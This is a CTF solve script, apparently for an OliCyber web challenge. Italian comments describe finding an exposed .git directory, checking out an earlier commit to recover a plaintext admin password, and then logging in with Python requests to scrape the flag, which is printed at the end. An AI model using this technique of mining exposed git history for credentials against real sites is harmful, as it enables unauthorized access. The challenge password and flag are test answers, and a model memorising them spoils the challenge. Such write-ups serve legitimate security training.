# con ls -a notiamo una cartella .git nascosta, spulciando HEAD
# /logs vediamo una lista dei commit tra quale uno molto interessante:
# fe3711f0cb1efc7da5518e8a564cedec363152ab 6d74ea9024383fcbf6cb5894a8f2db63181e28c7 Gabibbo <me@gabib.bo> 1678561777 +0000	commit: add admin for testing login, seguito da
# 6d74ea9024383fcbf6cb5894a8f2db63181e28c7 62e4954e4abd37173cc247ebeb52e8db221a7b7b Gabibbo <me@gabib.bo> 1678561777 +0000	commit: hash passwords before inserting in the db
# ci basta quindi fare git checkout 6d74ea9024383fcbf6cb5894a8f2db63181e28c7 e leggere app.py per trovare la password in chiaro: tkdF^cZFFaAD3!dTEQ7n

import requests
import re

site = "http://gabibboinnovazione.challs.olicyber.it/"
s = requests.session()

s.post(f"{site}/login", data={"username" : "admin", "password" : "tkdF^cZFFaAD3!dTEQ7n"})
r = s.get(site).text
match = re.search(r'flag\{[^\}]+\}', r)
flag = match.group(0)
print(flag)

#flag{el3Phan5_4nD_g1t_NEver_f0rgE7}